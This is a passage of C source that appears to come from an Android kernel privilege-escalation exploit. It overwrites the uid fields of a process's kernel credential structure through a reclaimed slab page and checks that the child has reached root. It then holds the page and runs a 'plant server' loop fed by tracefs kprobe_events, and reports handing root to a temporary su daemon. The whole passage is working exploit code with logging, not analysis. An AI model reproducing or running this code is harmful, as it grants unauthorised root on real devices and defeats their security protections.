			fclose(pf);
		}
		logf("[verify] child real uid=%d skip_fake_uid=%d uptime=%.2f\n",
		     ruid, g_skip_fake_uid, read_uptime());
		if (g_skip_fake_uid && ruid != 0) {
			int ok = 0;

			logf("[verify] install-plant erase did NOT land uid 0; fallback repair\n");
			for (int a = 0; a < 4 && !ok; a++)
				ok = !stage_write(g_fake_A + CRED_UID_OFF, MODE_ZERO,
						  "fake_uid_fb", NULL);
			logf("[verify] fallback repair ok=%d uptime=%.2f\n", ok,
			     read_uptime());
			pf = fopen(path, "r");
			if (pf) {
				while (fgets(line, sizeof(line), pf))
					if (!strncmp(line, "Uid:", 4) ||
					    !strncmp(line, "Gid:", 4))
						logf("[verify] after fallback %s", line);
				fclose(pf);
			}
		}
	}
	logf("[+] cred writes landed, waking child\n");
	dump_child_status(C, "pre-wake");

	if (g_skip_fake_uid) {
		logf("[fake] nofix: not sending second gate byte (child proceeds)\n");
	} else if (write(go_fd, "B", 1) != 1) {
		logf("[!] child wake write failed errno=%d\n", errno);
	}
	dump_child_status(C, "post-wake");
	close(go_fd);

	{
		struct child_report rep;
		struct pollfd pf = { .fd = st_fd, .events = POLLIN };
		ssize_t rn = -1;

		if (poll(&pf, 1, 10000) > 0)
			rn = read(st_fd, &rep, sizeof(rep));
		close(st_fd);
		if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC) {
			logf("[+] child report uid=%d euid=%d setresuid(0,0,0)=%d errno=%d resuid=%d/%d/%d\n",
			     rep.uid, rep.euid, rep.setuid_ret,
			     rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
			if (rep.setuid_ret != 0 || rep.reuid != 0)
				logf("[!] child did not reach euid 0\n");
		} else {
			logf("[!] child report missing (n=%zd)\n", rn);
		}
	}

	/* own90: the gate worker runs after this point and asks us for
	 * plants, so never block in waitpid(C) in fake mode (C itself waits
	 * for that worker). */
	if (!fake_stage) {
		int st = 0;

		if (waitpid(C, &st, 0) == C)
			logf("[+] child exit status=%#x\n", st);
	}
	/* YuKongA parks here in fake mode: the reclaimed page now backs a live
	 * task->cred, so this process must never exit and let the slab go. */
	if (fake_stage) {
		char last_line[256] = "";
		int reaped = 0;

		logf("[!] fake cred page held; plant server ready\n");
		logf("[+] done\n");
		(void)mkdir("/data/local/tmp/chan", 0777);
		for (;;) {
			FILE *f = fopen("/sys/kernel/tracing/kprobe_events", "r");

			if (f) {
				char line[512];

				while (fgets(line, sizeof(line), f)) {
					char *p2 = strstr(line, "req_");
					unsigned long long addr = 0;
					int mode = 0, att = 0;
					char linekey[256] = "";

					if (!p2)
						continue;
					if (sscanf(p2 + 4, "%llx_%d_%d", &addr, &mode,
						   &att) != 3)
						continue;
					snprintf(linekey, sizeof(linekey), "%s", p2);
					if (!addr || linekey[0] == 0 ||
					    !strcmp(linekey, last_line))
						continue;
					snprintf(last_line, sizeof(last_line), "%s",
						 linekey);
					{
						struct plant_res pr;
						FILE *o;

						memset(&pr, 0, sizeof(pr));
						logf("[plant] tracefs req %#llx mode=%d\n",
						     addr, mode);
						run_plant(addr, 1, &pr, 0, mode);
						o = fopen("/data/local/tmp/chan/plant_res",
							  "w");
						if (o) {
							fprintf(o, "%d %llx\n",
								pr.ok ? 1 : 0, addr);
							fclose(o);
						}
						logf("[plant] req done ok=%d\n", pr.ok);
					}
				}
				fclose(f);
			}
			if (!reaped) {
				int st = 0;

				if (waitpid(C, &st, WNOHANG) == C) {
					logf("[+] child exit status=%#x\n", st);
					reaped = 1;
				}
			}
			usleep(200000);
		}
	}

	/* A held zombie from a failed plant must not be reaped by us, and must
	 * not be adopted-then-reaped by init either, so the process cannot exit
	 * while one exists. The App only needs the su daemon, which is already
	 * running, so report it and park. */
	if (g_held) {
		logf("[!] %d failed plant(s) left held zombies; parking (reboot required)\n",
		     g_held);
		logf("[+] root handed to the temporary-su daemon\n");
		logf("[+] done\n");
		for (;;)
			pause();
	}
	logf("[+] done\n");
	return 0;
}

